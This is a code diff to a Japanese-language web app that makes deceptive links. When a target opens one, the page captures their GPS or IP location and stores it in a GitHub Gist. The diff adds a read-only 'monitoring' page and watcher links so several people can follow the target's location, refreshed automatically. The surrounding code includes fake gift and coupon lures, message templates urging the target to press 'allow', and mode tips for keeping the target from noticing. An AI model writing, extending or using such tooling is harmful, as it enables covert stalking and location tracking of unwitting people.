@@ -20,10 +20,11 @@ body{background:#0e1116;color:#e6e8eb;font-family:-apple-system,BlinkMacSystemFo
 label{display:block;font-size:11.5px;color:#8b93a0;margin:12px 0 5px;}
 label:first-child{margin-top:0;}
 input,select,textarea{width:100%;background:#0d1117;border:1px solid #2a313c;color:#fff;border-radius:10px;padding:11px;font-size:16px;font-family:inherit;}
-textarea{min-height:74px;font-size:13px;line-height:1.65;}
+textarea{min-height:70px;font-size:13px;line-height:1.65;}
 button{border:0;border-radius:10px;padding:12px 14px;font-size:13px;font-weight:700;font-family:inherit;background:#232a34;color:#dfe4ea;}
 button.pri{background:#1d4ed8;color:#fff;}
 button.dang{background:#3a1010;color:#f87171;}
+button.vw{background:#4c1d95;color:#fff;}
 button.sm{padding:9px 10px;font-size:11.5px;}
 .row{display:flex;gap:8px;margin-top:10px;}
 .row.wrap{flex-wrap:wrap;}
@@ -31,8 +32,13 @@ button.sm{padding:9px 10px;font-size:11.5px;}
 .chk{display:flex;align-items:center;gap:9px;font-size:13px;color:#dfe4ea;margin:14px 0 0;font-weight:400;}
 .chk input{width:auto;padding:0;margin:0;transform:scale(1.15);}
 .link{background:#0a0d12;border:1px solid #1f242e;border-radius:10px;padding:10px;font-size:11.5px;word-break:break-all;color:#93c5fd;line-height:1.5;}
+.link.vw{border-color:#4c1d95;color:#c4b5fd;}
 .muted{font-size:11.5px;color:#8b93a0;margin-top:8px;}
 .h2{font-size:13px;font-weight:800;margin-bottom:8px;}
+.sechead{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:800;margin-bottom:7px;}
+.num{display:inline-flex;width:19px;height:19px;border-radius:50%;align-items:center;justify-content:center;font-size:11px;flex:0 0 auto;}
+.n1{background:#1d4ed8;color:#fff;}
+.n2{background:#4c1d95;color:#fff;}
 .hit{background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;}
 .hit .a{font-size:12.5px;color:#fff;font-weight:700;}
 .hit .m{display:flex;gap:9px;flex-wrap:wrap;font-size:10.5px;color:#8b93a0;margin-top:4px;}
@@ -41,12 +47,14 @@ button.sm{padding:9px 10px;font-size:11.5px;}
 .tb{background:#0d2340;color:#60a5fa;}
 .geo{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#60a5fa;margin-top:7px;cursor:pointer;word-break:break-all;}
 .geo:active{opacity:.6;}
-#resMap{height:210px;border-radius:10px;margin-top:10px;overflow:hidden;background:#0a0d12;}
-.hitem{display:flex;justify-content:space-between;align-items:center;gap:8px;background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;cursor:pointer;}
+#resMap,#vwMap{height:210px;border-radius:10px;margin-top:10px;overflow:hidden;background:#0a0d12;}
+.hitem{display:flex;justify-content:space-between;align-items:center;gap:7px;background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;}
 .hitem .n{font-size:12.5px;color:#fff;font-weight:700;}
 .hitem .d{font-size:10.5px;color:#8b93a0;}
-.hitem .go{flex:0 0 auto;font-size:11px;color:#60a5fa;font-weight:800;padding:6px 2px 6px 8px;}
-.hitem .del{flex:0 0 auto;font-size:11px;color:#8b93a0;font-weight:700;background:#1b2129;border-radius:8px;padding:8px 11px;}
+.hitem .act{flex:0 0 auto;font-size:11px;color:#8b93a0;font-weight:700;background:#1b2129;border-radius:8px;padding:8px 10px;cursor:pointer;}
+.hitem .act.vw{color:#c4b5fd;}
+.divider{height:1px;background:#1f242e;margin:20px 0 14px;}
+.vwfoot{text-align:center;font-size:11px;color:#5d6878;padding:10px 0 24px;letter-spacing:.06em;}
 ol{padding-left:20px;margin:6px 0;font-size:12px;color:#a8b0bb;line-height:1.9;}
 code{background:#0a0d12;border-radius:4px;padding:1px 5px;font-size:11px;color:#93c5fd;}
 </style>
@@ -134,6 +142,7 @@ function shopsNear(lat, lon){
 }
 function geoText(lat, lon){ return (Math.round(lat*1e5)/1e5) + ", " + (Math.round(lon*1e5)/1e5); }
 function openMaps(lat, lon){ location.href = "https://maps.google.com/?q=" + lat + "," + lon; }
+function watchUrl(id){ return BASE + "#r=gh" + id + "&v=view"; }
 
 /* ===================== Gist ===================== */
 function createGist(){
@@ -182,7 +191,7 @@ function fmtDT(ts){
 }
 function modeLabel(m){ return ({ "":"ふつう","min":"極小","blank":"真っ白","go":"確実","gift":"ギフト" }[m] || "ふつう"); }
 
-/* ===================== 地図（壊れにくく） ===================== */
+/* ===================== 地図 ===================== */
 var maps = {};
 function ensureLeaflet(cb){
   if(typeof L !== "undefined"){ cb(true); return; }
@@ -216,6 +225,98 @@ function drawMap(elId, lat, lon, dark){
     m.__mk = L.marker([lat,lon]).addTo(m);
     [0, 150, 400, 800].forEach(function(t){ setTimeout(function(){ try{ m.invalidateSize(); }catch(e){} }, t); });
   });
+}
+
+/* =====================================================================
+   監視専用ページ（v=view）
+   ・トークンなし / 読み取り専用 / 記録されない / アプリには戻れない
+   ===================================================================== */
+if(RID && V === "view"){
+  var IV = TOKEN ? 20000 : 120000;
+  var timer = null;
+
+  $("app").innerHTML =
+    '<div class="ttl" id="vwTtl">読み込み中…</div>'
+    + '<div class="sub">監視モード。見るだけで、あなたは記録されません。</div>'
+    + '<div class="card" style="margin-top:12px;">'
+      + '<div id="vwAddr" style="font-size:15px;line-height:1.7;"></div>'
+      + '<div class="muted" id="vwMeta"></div>'
+      + '<div class="geo hidden" id="vwGeo"></div>'
+      + '<div class="muted" id="vwNote"></div>'
+      + '<div id="vwMap"></div>'
+      + '<div class="row"><button id="vwReload">今すぐ更新</button><button id="vwCopy">結果をコピー</button></div>'
+    + '</div>'
+    + '<div class="card hidden" id="vwHitsCard">'
+      + '<div class="h2">記録 <span id="vwHitsN" style="color:#8b93a0;font-weight:400;font-size:11px;"></span></div>'
+      + '<div id="vwHits"></div>'
+    + '</div>'
+    + '<div class="vwfoot">監視専用ページ</div>';
+
+  function vwLoad(){
+    req("GET", GH+"/"+RID, {"Content-Type":"application/json"}).then(function(r){
+      if(r.status === 403 || r.status === 429){
+        IV = 300000;
+        $("vwNote").textContent = "GitHubの更新制限にかかりました。自動更新を5分に落としました。";
+        return;
+      }
+      if(!r.ok) throw new Error("HTTP " + r.status);
+      var j = JSON.parse(r.text), hits = [], loc = null;
+      try{ hits = JSON.parse((j.files["hits.json"] && j.files["hits.json"].content) || "[]"); }catch(e){ hits = []; }
+      try{ loc = JSON.parse((j.files["loc.json"] && j.files["loc.json"].content) || "null"); }catch(e){ loc = null; }
+      if(!Array.isArray(hits)) hits = [];
+      var last = null;
+      for(var i = hits.length-1; i >= 0; i--){ if(hits[i].gps){ last = hits[i]; break; } }
+      if(!last) last = hits.length ? hits[hits.length-1] : loc;
+
+      if(!last){
+        $("vwTtl").textContent = "まだ結果がありません";
+        $("vwAddr").textContent = "";
+        $("vwMeta").textContent = "";
+        $("vwNote").textContent = "相手がリンクを開くと、ここに表示されます。";
+        return;
+      }
+      $("vwTtl").textContent = (last.name || "相手") + " の現在地";
+      $("vwAddr").textContent = last.addr || last.city || "";
+      $("vwMeta").innerHTML = '<span class="tag '+(last.gps ? "tg" : "tb")+'">'+(last.gps ? "GPS ±"+(last.acc||"?")+"m" : "IP（市レベル）")+'</span>'
+        + ' <span>'+fmtDT(last.ts)+'</span>';
+      if(last.lat){
+        $("vwGeo").textContent = "📍 " + geoText(last.lat, last.lon) + "（タップで地図アプリ）";
+        $("vwGeo").classList.remove("hidden");
+        $("vwGeo").onclick = function(){ openMaps(last.lat, last.lon); };
+        drawMap("vwMap", last.lat, last.lon, true);
+      } else {
+        $("vwGeo").classList.add("hidden");
+      }
+      $("vwNote").textContent = hits.length ? "記録 " + hits.length + "件 ／ " + Math.round(IV/1000) + "秒ごとに自動更新" : "";
+      $("vwHitsCard").classList.toggle("hidden", !hits.length);
+      $("vwHitsN").textContent = hits.length ? "全 "+hits.length+"件" : "";
+      $("vwHits").innerHTML = hits.slice().reverse().map(function(x){
+        return '<div class="hit"><div class="a">'+esc(x.addr || x.city || "—")+'</div>'
+          + (x.lat ? '<div class="geo" style="margin-top:3px;">'+geoText(x.lat,x.lon)+'</div>' : "")
+          + '<div class="m"><span class="tag '+(x.gps ? "tg" : "tb")+'">'+(x.gps ? "GPS ±"+(x.acc||"?")+"m" : "IP")+'</span>'
+          + '<span>'+fmtDT(x.ts)+'</span></div></div>';
+      }).join("");
+    }).catch(function(){
+      $("vwTtl").textContent = "読み込めませんでした";
+      $("vwNote").textContent = "リンクが停止されている可能性があります。";
+    });
+  }
+  function loop(){
+    if(timer) clearTimeout(timer);
+    timer = setTimeout(function(){
+      if(document.visibilityState === "visible") vwLoad();
+      loop();
+    }, IV);
+  }
+  $("vwReload").onclick = function(){ $("vwReload").textContent = "更新中…"; vwLoad(); setTimeout(function(){ $("vwReload").textContent = "今すぐ更新"; }, 1200); };
+  $("vwCopy").onclick = function(){
+    copy(($("vwAddr").textContent||"") + "\n" + ($("vwGeo").textContent||""));
+    $("vwCopy").textContent = "コピーしました";
+    setTimeout(function(){ $("vwCopy").textContent = "結果をコピー"; }, 1400);
+  };
+  vwLoad();
+  loop();
+  return;
 }
 
 /* =====================================================================
@@ -348,7 +449,7 @@ if(RID){
           + '<div style="font-size:32px;margin-bottom:12px;">✅</div>'
           + '<div style="font-size:17px;font-weight:800;margin-bottom:10px;">特定しました</div>'
           + '<div style="font-size:13.5px;line-height:1.7;color:#333;">'+esc(S.addr||"")+'</div>'
-          + '<div style="font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#7c8797;margin-top:8px;">'+geoText(S.lat||0,S.lon||0)+'</div>'
+          + (S.lat ? '<div style="font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#7c8797;margin-top:8px;">'+geoText(S.lat,S.lon)+'</div>' : "")
           + (S.acc ? '<div style="font-size:11.5px;color:#9aa0a6;margin-top:8px;">精度 ±'+S.acc+'m</div>' : "")
           + '</div>';
       } else {
@@ -384,7 +485,6 @@ if(RID){
     }
   }
 
-  /* ---- ギフトモード ---- */
   function giftView(){
     var GIFT = hp.get("gi") || "500円クーポン";
     var EX = parseInt(hp.get("x") || "0", 10);
@@ -531,11 +631,10 @@ $("app").innerHTML =
 +   '</div>'
 
 +   '<div class="card hidden" id="outBox">'
-+     '<div class="h2">共有リンク</div>'
++     '<div class="sechead"><span class="num n1">1</span>相手に送るリンク</div>'
++     '<div class="muted" style="margin:0 0 6px;">これを開くと相手の現在地が届きます。</div>'
 +     '<div class="link" id="linkField"></div>'
-+     '<div class="row"><button id="btnCopy" class="pri">リンクをコピー</button><button id="btnOpen">開いて確認</button></div>'
-+     '<label>そのまま送る（タップで開く）</label>'
-+     '<div class="row wrap" id="shareRow"></div>'
++     '<div class="row"><button id="btnCopy" class="pri">コピー</button><button id="btnOpen">開いて確認</button></div>'
 +     '<label>送る文面</label>'
 +     '<textarea id="tmpl"></textarea>'
 +     '<div class="row wrap">'
@@ -543,13 +642,29 @@ $("app").innerHTML =
 +       '<button class="sm" data-tp="1">許可押してね</button>'
 +       '<button class="sm" data-tp="2">ギフト届いたよ</button>'
 +     '</div>'
-+     '<div class="row"><button id="btnTmplCopy">文面をコピー</button></div>'
++     '<div class="row wrap" id="shareRow"></div>'
+
++     '<div class="divider"></div>'
+
++     '<div class="sechead"><span class="num n2">2</span>監視員に送るリンク</div>'
++     '<div class="muted" style="margin:0 0 6px;">何人の人に配ってもOK。開いた人は記録されず、鍵も渡りません。</div>'
++     '<div class="link vw" id="viewField"></div>'
++     '<div class="row"><button id="btnCopyView" class="vw">コピー</button></div>'
++     '<label>送る文面</label>'
++     '<textarea id="tmplV"></textarea>'
++     '<div class="row wrap">'
++       '<button class="sm" data-tv="0">これ見てて</button>'
++       '<button class="sm" data-tv="1">更新されたら分かるよ</button>'
++     '</div>'
++     '<div class="row wrap" id="shareRowV"></div>'
+
++     '<div class="divider"></div>'
 +     '<div class="row"><button id="btnStop" class="dang">このリンクを停止する</button></div>'
 +   '</div>'
 
 +   '<div class="card">'
 +     '<div class="h2">履歴</div>'
-+     '<div class="muted" style="margin:0 0 9px;">タップで結果を開く。「消す」は履歴からのみ（リンクは生きたまま）。</div>'
++     '<div class="muted" style="margin:0 0 9px;">タップで結果を開く。「監視」で監視リンクをコピー。「消す」は履歴からのみ。</div>'
 +     '<div id="histList"></div>'
 +     '<div class="row"><button id="btnHistClear" class="sm">履歴を全部消す</button></div>'
 +   '</div>'
@@ -565,6 +680,8 @@ $("app").innerHTML =
 +       '<div id="resNote" class="muted"></div>'
 +       '<div id="resMap"></div>'
 +       '<div class="row"><button id="btnReload">更新</button><button id="btnResCopy">結果をコピー</button></div>'
++       '<div class="row"><button id="btnViewLink" class="vw">監視リンクをコピー</button></div>'
++       '<div class="link vw hidden" id="viewLink" style="margin-top:8px;"></div>'
 +       '<div class="row"><button id="btnResStop" class="dang">このリンクを停止する</button></div>'
 +     '</div>'
 +   '</div>'
@@ -588,10 +705,16 @@ $("app").innerHTML =
 +     '<ol>'
 +       '<li>上のトークン欄に、gist権限のトークンを貼って保存</li>'
 +       '<li>送るタブで名前とモードを選んでリンクを作る</li>'
-+       '<li>LINEなどで相手に送る</li>'
++       '<li>①を相手に送る。結果だけ見せたい人は②を送る</li>'
 +       '<li>相手が開くと、結果タブに届く</li>'
 +     '</ol>'
 +     '<div class="muted">モードの目安：バレたくない→極小か真っ白。確実に取る→確実かギフト。</div>'
++   '</div>'
++   '<div class="card">'
++     '<div class="h2">監視リンク（②）について</div>'
++     '<div class="muted" style="margin:0 0 8px;">トークンを含まないので、何人の人に配っても安全。監視員は記録されず、読むだけ。</div>'
++     '<div class="muted" style="margin:0 0 8px;">アプリには戻れない。本当に監視だけのページ。</div>'
++     '<div class="muted" style="margin:0;">自動更新は2分ごと。制限にかかると5分に落ちます。</div>'
 +   '</div>'
 +   '<div class="card">'
 +     '<div class="h2">注意</div>'
@@ -622,25 +745,36 @@ var SHARE = [
   ["Telegram", function(t){ return "https://t.me/share/url?url=" + encodeURIComponent(t); }],
   ["その他", null]
 ];
-$("shareRow").innerHTML = SHARE.map(function(s,i){ return '<button class="sm" data-sh="'+i+'">'+s[0]+'</button>'; }).join("");
-$("shareRow").onclick = function(e){
-  var i = e.target.dataset.sh; if(i === undefined) return;
-  var text = $("tmpl").value.trim() || $("linkField").textContent;
-  if(SHARE[i][0] === "その他"){
-    if(navigator.share) navigator.share({ text:text }).catch(function(){});
-    else copy(text);
-    return;
-  }
-  location.href = SHARE[i][1](text);
-};
+function makeShareRow(el, getText){
+  el.innerHTML = SHARE.map(function(s,i){ return '<button class="sm" data-sh="'+i+'">'+s[0]+'</button>'; }).join("");
+  el.onclick = function(e){
+    var i = e.target.dataset.sh; if(i === undefined) return;
+    var text = getText();
+    if(SHARE[i][0] === "その他"){
+      if(navigator.share) navigator.share({ text:text }).catch(function(){});
+      else copy(text);
+      return;
+    }
+    location.href = SHARE[i][1](text);
+  };
+}
+makeShareRow($("shareRow"), function(){ return $("tmpl").value.trim() || $("linkField").textContent; });
+makeShareRow($("shareRowV"), function(){ return $("tmplV").value.trim() || $("viewField").textContent; });
 
 var TMPL = [
   "これ開いてみて。開くだけでOK。",
   "リンク開いてみて。「許可」押してくれたら正確になる。",
   "ギフト届いたよ。開いて受け取って。"
 ];
+var TMPL_V = [
+  "これ見てて。開くだけで、君は何も起きないよ。",
+  "監視用。更新されたら自動で変わるよ。"
+];
 document.querySelectorAll("[data-tp]").forEach(function(b){
   b.onclick = function(){ $("tmpl").value = TMPL[+b.dataset.tp] + "\n" + $("linkField").textContent; };
+});
+document.querySelectorAll("[data-tv]").forEach(function(b){
+  b.onclick = function(){ $("tmplV").value = TMPL_V[+b.dataset.tv] + "\n" + $("viewField").textContent; };
 });
 
 function copy(s){
@@ -657,13 +791,16 @@ $("btnMake").onclick = function(){
     : "";
   createGist().then(function(id){
     var url = BASE + "#n=" + encodeURIComponent(nm) + "&r=gh" + id + "&t=" + TOKEN + (md ? "&v=" + md : "") + (gp ? "&g=1" : "") + extra;
+    var wurl = watchUrl(id);
     var h = getHist();
     h.unshift({ id:id, name:nm, mode:md, gps:gp, ts:Date.now() });
     setHist(h);
     CUR = h[0];
     $("outBox").classList.remove("hidden");
     $("linkField").textContent = url;
+    $("viewField").textContent = wurl;
     $("tmpl").value = (md === "gift" ? TMPL[2] : TMPL[0]) + "\n" + url;
+    $("tmplV").value = TMPL_V[0] + "\n" + wurl;
     renderHist();
     $("btnMake").textContent = "リンクを作る";
     $("makeMsg").textContent = "";
@@ -672,9 +809,9 @@ $("btnMake").onclick = function(){
     $("makeMsg").textContent = "作成に失敗：" + e.message;
   });
 };
-$("btnCopy").onclick = function(){ copy($("linkField").textContent); $("btnCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnCopy").textContent = "リンクをコピー"; }, 1400); };
+$("btnCopy").onclick = function(){ copy($("linkField").textContent); $("btnCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnCopy").textContent = "コピー"; }, 1400); };
+$("btnCopyView").onclick = function(){ copy($("viewField").textContent); $("btnCopyView").textContent = "コピーしました"; setTimeout(function(){ $("btnCopyView").textContent = "コピー"; }, 1400); };
 $("btnOpen").onclick = function(){ location.href = $("linkField").textContent; };
-$("btnTmplCopy").onclick = function(){ copy($("tmpl").value); $("btnTmplCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnTmplCopy").textContent = "文面をコピー"; }, 1400); };
 
 function doStop(id, after){
   stopGist(id).then(function(){
@@ -700,12 +837,12 @@ function renderHist(){
   if(!h.length){ $("histList").innerHTML = '<div class="muted" style="margin:0;">まだありません</div>'; return; }
   $("histList").innerHTML = h.map(function(x){
     return '<div class="hitem" data-id="'+x.id+'">'
-      + '<div style="min-width:0;flex:1;">'
+      + '<div style="min-width:0;flex:1;cursor:pointer;" data-open="'+x.id+'">'
         + '<div class="n">'+esc(x.name || "名称なし")+(x.stopped ? ' <span style="color:#f87171;font-size:10px;">停止</span>' : "")+'</div>'
         + '<div class="d">'+fmtDT(x.ts)+' ／ '+modeLabel(x.mode)+'</div>'
       + '</div>'
-      + '<div class="go">'+(x.stopped ? "開く" : "見る")+'</div>'
-      + '<div class="del" data-del="'+x.id+'">消す</div>'
+      + '<div class="act vw" data-share="'+x.id+'">監視</div>'
+      + '<div class="act" data-del="'+x.id+'">消す</div>'
     + '</div>';
   }).join("");
 }
@@ -718,8 +855,15 @@ $("histList").onclick = function(e){
     renderHist();
     return;
   }
-  var el = e.target.closest(".hitem"); if(!el) return;
-  var id = el.dataset.id;
+  var shareId = e.target.dataset.share;
+  if(shareId){
+    copy(watchUrl(shareId));
+    e.target.textContent = "✓";
+    setTimeout(renderHist, 1100);
+    return;
+  }
+  var openEl = e.target.closest("[data-open]"); if(!openEl) return;
+  var id = openEl.dataset.open;
   var x = getHist().filter(function(y){ return y.id === id; })[0]; if(!x) return;
   if(x.stopped){ location.href = BASE + "#n=" + encodeURIComponent(x.name) + "&r=gh" + id + "&t=" + TOKEN; return; }
   CUR = x;
@@ -767,6 +911,15 @@ $("btnReload").onclick = refreshRes;
 $("btnResCopy").onclick = function(){
   copy(($("resAddr").textContent || "") + "\n" + ($("resGeo").textContent || "") + "\n" + ($("resMeta").textContent || ""));
   $("btnResCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnResCopy").textContent = "結果をコピー"; }, 1400);
+};
+$("btnViewLink").onclick = function(){
+  if(!CUR) return;
+  var u = watchUrl(CUR.id);
+  copy(u);
+  $("viewLink").textContent = u;
+  $("viewLink").classList.remove("hidden");
+  $("btnViewLink").textContent = "コピーしました";
+  setTimeout(function(){ $("btnViewLink").textContent = "監視リンクをコピー"; }, 1400);
 };
 $("btnCsv").onclick = function(){
   if(!CUR) return;
